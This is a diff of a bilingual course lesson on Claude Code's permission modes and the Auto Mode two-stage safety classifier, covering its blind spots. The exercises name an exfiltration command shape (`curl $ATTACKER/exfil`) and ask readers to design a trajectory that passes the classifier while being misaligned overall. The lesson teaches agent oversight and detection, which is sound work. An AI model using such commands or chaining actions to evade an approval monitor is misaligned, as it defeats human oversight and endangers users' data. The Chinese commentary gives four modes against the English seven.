@@ -2,27 +2,31 @@
 
 > Claude Code exposes seven permission modes. "plan" asks before every action, "default" asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval with a two-stage parallel safety classifier: a single-token fast check runs on every action; flagged actions kick off a chain-of-thought deep review. Action budgets are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a research preview — Anthropic has stated explicitly that the classifier is not sufficient alone.
 
-**Type:** Learn
-**Languages:** Python (stdlib, two-stage classifier simulator)
-**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
-**Time:** ~45 minutes
+**Type:** Learn | **类型:** 学习
+**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python (stdlib, two-stage classifier simulator)
+**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
+**Time:** ~45 minutes | **时间:** ~45 minutes
 
-## The Problem | 问题
+## The Problem | 问题引入
 
 > **【中文解读】** Claude Code 的权限模式是 Agent 安全控制的典型案例。四种模式：(1) Ask——每次操作需用户确认；(2) Edit——文件编辑自动批准，命令需确认；(3) YOLO——所有操作自动批准（危险）；(4) Plan——先规划后执行。这些模式反映了 Agent 自主性与安全性的基本权衡。
 
 > **【拓展：claude code permission modes】** Claude Code 的权限设计体现了 2026 年编码 Agent 的安全最佳实践。关键原则：(1) 最小权限——默认只授予必要权限；(2) 渐进授权——用户可以根据信任度逐步放宽限制；(3) 审计追踪——所有操作都有日志；(4) 紧急停止——随时可以中断。这些原则同样适用于其他 Agent 系统的设计。
 
-An autonomous coding agent on your machine is a distinct security category. The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.
+An autonomous coding agent on your machine is a distinct security category.
 
-Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.
+> 你机器上的自主编码 Agent 是一个独特的安全类别。攻击面是 Agent 能触及的一切。 The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.
+
+Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder.
+
+> Claude Code 的权限系统是 Anthropic 的答案。不是一个开关，而是七种模式。 Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.
 
 
 > **【中文解读】** 本节介绍了 AI Agent 的核心概念和实现方法。Agent 是 LLM 驱动的自主系统，能够观察环境、思考决策、执行行动并循环迭代直到完成目标。
 
 The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?
 
-## The Concept | 概念
+## The Concept | 核心概念
 
 ### The seven permission modes
 
@@ -40,7 +44,9 @@ The engineering question: what does this system catch, what does it miss, and wh
 
 ### Auto Mode in one page
 
-Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model. Structure:
+Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model.
+
+> Auto Mode 是第一个将每次操作审批委托给模型的权限模式。 Structure:
 
 1. **Stage 1 — single-token classifier.** Runs on every proposed action. Cheap. Returns "safe" or "flag." Designed to run in parallel with the main agent loop so approved actions do not sit in a queue.
 2. **Stage 2 — secondary policy/safety review.** Runs only on flagged actions. Performs a focused policy and safety assessment over the action, the current state of the session, and the declared task. Escalates to user HITL if confidence is low.
@@ -74,35 +80,31 @@ Anthropic shipped Auto Mode as a research preview. The documentation is explicit
 - Unattended background run: `autoMode` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
 - Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
 
-## Use It | 使用方法
+## Use It | 用框架实现
 
 `code/main.py` simulates the two-stage classifier. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.
 
-## Ship It | 部署上线
+## Ship It | 产出物
 
 `outputs/skill-permission-mode-picker.md` matches a task description to the right permission mode, budget caps, and required isolation.
 
 ## Exercises | 练习题
 
 1. Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?
-   *思考并实践此练习*
 
 2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
-   *思考并实践此练习*
 
 3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `autoMode` unattended?
-   *思考并实践此练习*
 
 4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
-   *思考并实践此练习*
 
 5. Describe one trajectory where every individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
-   *思考并实践此练习*
 
-## Key Terms | 关键术语
+## Key Terms | 术语速查表
 
 | Term | What people say | What it actually means |
-|---|---|---|---|
+|---|---|---|
+| 术语 | 通俗说法 | 实际含义 |
 | Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |  |
 | plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |  |
 | acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |  |
